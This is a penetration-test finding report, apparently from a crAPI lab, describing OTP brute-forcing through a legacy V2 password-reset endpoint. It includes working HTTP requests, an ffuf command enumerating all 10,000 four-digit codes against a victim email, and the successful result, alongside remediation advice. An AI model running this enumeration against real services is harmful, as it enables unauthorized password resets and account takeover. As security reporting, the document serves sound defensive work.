# Improper Inventory Management Leading to OTP Brute-Force and Password Reset Authorization Bypass

## Severity

**High** — potentially **Critical** if successful exploitation results in complete account takeover.

## Description

The application exposes multiple versions of its authentication API, including the current **V3** and a legacy **V2** implementation of the password-reset OTP verification functionality.

Testing identified inconsistent security controls between the two API versions. The V3 endpoint rejected the supplied OTP, while the legacy V2 endpoint accepted the OTP and returned a successful verification response.

Furthermore, the V2 endpoint does not appear to implement effective OTP brute-force protection. A 4-digit OTP can be systematically tested against the endpoint, and the valid OTP can be identified by filtering the application's generic `500 Invalid OTP` response.

The combination of an exposed legacy authentication endpoint, inconsistent security controls, and insufficient OTP brute-force protection allows an attacker to potentially bypass the intended password-reset security mechanism.

## Proof of Concept

### 1. V3 Endpoint Rejects the OTP

The password-reset OTP was submitted to the current V3 endpoint:

```http
POST /identity/api/auth/v3/check-otp HTTP/1.1
Host: pentest.lab:8888
Content-Type: application/json

{
    "email": "victimaccount@mail.com",
    "password": "Password123!",
    "otp": "5658"
}
```

The V3 implementation rejected the request:

```http
HTTP/1.1 500
Content-Type: application/json

{
    "message": "Invalid OTP! Please try again..",
    "status": 500
}
```

### 2. Legacy V2 Endpoint Accepts the OTP

The same OTP was submitted to the legacy V2 endpoint using an authenticated session:

```http
POST /identity/api/auth/v2/check-otp HTTP/1.1
Host: pentest.lab:8888
Authorization: Bearer <authenticated-user-token>
Content-Type: application/json

{
    "email": "victimaccount@mail.com",
    "password": "Password123!",
    "otp": "5658"
}
```

The V2 endpoint returned:

```http
HTTP/1.1 200

{
    "message": "OTP verified",
    "status": 200
}
```

This demonstrates that the legacy V2 endpoint provides a different security outcome from the current V3 implementation.

### 3. OTP Brute-Force Testing

The V2 endpoint was then tested for OTP brute-force resistance using `ffuf` against a 10,000-entry OTP wordlist.

The request template was:

```bash
ffuf -u http://pentest.lab:8888/identity/api/auth/v2/check-otp \
-w /home/kali/Documents/Labs/APISec/crAPI/crAPINotes/wordlists/otp.txt \
-X POST \
-d '{"email":"victimaccount@mail.com","otp":"FUZZ","password":"Password123!"}' \
-H "Content-Type: application/json" \
-fc 500
```

The application returned a generic `500` response for invalid OTP values. These responses were filtered using:

```text
-fc 500
```

The scan completed the entire 10,000-value OTP space and identified a unique successful response:

```text
5658 [Status: 200, Size: 39, Words: 2, Lines: 1, Duration: 3698ms]
```

The successful response corresponds to:

```json
{
    "message": "OTP verified",
    "status": 200
}
```

The result demonstrates that the OTP can be enumerated through the legacy V2 endpoint without an effective account lockout, rate limit, or attempt restriction sufficient to prevent systematic OTP guessing.

## Attack Scenario

An attacker can abuse the exposed legacy authentication endpoint as an alternative to the V3 implementation.

The attack flow is:

```text
Identify legacy V2 endpoint
        ↓
Initiate password-reset process
        ↓
Target victim account
        ↓
Enumerate 4-digit OTP
        ↓
Identify successful OTP response
        ↓
OTP verification succeeds
        ↓
Continue password-reset flow
        ↓
Potential account takeover
```

The effective OTP search space is only **10,000 possible values (0000–9999)**. Without adequate rate limiting, lockout, progressive delays, or other anti-automation controls, this space can be systematically enumerated.

## Root Cause

The root cause is the continued exposure of a legacy authentication API version after introduction of the V3 implementation, combined with inconsistent security controls between API versions.

The V2 implementation exposes a password-reset OTP verification mechanism that:

1. Remains externally accessible.
2. Accepts OTP verification requests independently of the newer V3 implementation.
3. Allows systematic OTP enumeration.
4. Does not demonstrate effective OTP attempt limiting or account lockout.
5. Produces distinguishable responses between invalid and valid OTP attempts.

This represents **Improper Inventory Management / Improper API Version Management**, with the legacy endpoint creating an alternative attack surface containing weaker authentication controls.

## Impact

An attacker who can interact with the legacy V2 endpoint can systematically enumerate the victim's 4-digit OTP.

Successful OTP verification may allow the attacker to continue the password-reset process and potentially set a new password for the targeted account.

If the subsequent password-reset operation is also vulnerable to the same authorization weakness, the complete attack chain can result in **account takeover**.

The impact may include:

* Unauthorized password reset.
* Account takeover.
* Unauthorized access to private account data.
* Impersonation of the affected user.
* Potential compromise of functionality or resources accessible through the account.

## Security Control Comparison

| Test                              | V2                 | V3                                 |
| --------------------------------- | ------------------ | ---------------------------------- |
| Endpoint accessible               | Yes                | Yes                                |
| Same password-reset functionality | Yes                | Yes                                |
| Invalid OTP response              | `500`              | `500`                              |
| Valid OTP response                | `200 OTP verified` | `200 OTP verified` when applicable |
| OTP brute-force protection        | **Not observed**   | Should be enforced                 |
| Legacy endpoint exposed           | **Yes**            | N/A                                |
| API-version security consistency  | **No**             | Current implementation             |

## Recommended Remediation

### 1. Retire the Legacy V2 Endpoint

If V2 is no longer required, remove it from external exposure.

Requests to:

```text
/identity/api/auth/v2/check-otp
```

should no longer be accepted.

### 2. Implement Effective OTP Rate Limiting

Password-reset OTP verification should enforce strict attempt limits per:

* Account.
* Reset transaction.
* Source/IP where appropriate.
* Device/session where appropriate.

After a defined number of failed attempts, the OTP should be invalidated and a new reset transaction required.

### 3. Use a Larger OTP or Cryptographically Strong Reset Token

A 4-digit OTP provides only 10,000 possible combinations and is unsuitable as the sole protection for a high-value password-reset operation without strong rate limiting.

Consider a sufficiently random, short-lived reset token or a larger OTP combined with strict attempt controls.

### 4. Bind OTPs to a Reset Transaction

The OTP should be associated server-side with:

```text
Reset Transaction ID
        +
Target Account
        +
Expiration
        +
Attempt Counter
```

The application should not rely solely on the client-supplied `email` parameter.

### 5. Standardize Security Controls Across API Versions

All active API versions must enforce the same minimum security requirements for:

* Authentication.
* Authorization.
* OTP validation.
* Rate limiting.
* Password-reset authorization.
* Session/token issuance.

### 6. Maintain an API Inventory

Maintain an authoritative inventory of all API versions, including:

* Active endpoints.
* Deprecated endpoints.
* Internal endpoints.
* Authentication endpoints.
* Planned retirement dates.

Deprecated authentication endpoints should be removed rather than left accessible indefinitely.

## Classification

**Primary:** Improper Inventory Management / Improper API Version Management

**Related:**

* Weak Password Recovery Mechanism
* Missing/Insufficient Rate Limiting
* Broken Access Control
* OTP Brute-Force

**Potential CWE mappings:**

* **CWE-1059** — Incomplete Identification of Resource Requirements
* **CWE-307** — Improper Restriction of Excessive Authentication Attempts
* **CWE-640** — Weak Password Recovery Mechanism
* **CWE-862** — Missing Authorization

## Conclusion

The exposed legacy V2 password-reset endpoint creates an alternate authentication attack surface that is not adequately protected against OTP enumeration.

The issue is particularly significant because the OTP consists of only four digits, giving an attacker a finite search space of 10,000 possibilities. During testing, the complete OTP wordlist was successfully processed and the valid OTP `5658` was uniquely identified through the application's `200` response.

Combined with the ability to successfully verify the OTP through the legacy V2 endpoint, this condition can potentially allow an attacker to bypass the intended password-reset controls and, if the subsequent password-change operation is accessible, take complete control of the targeted account.
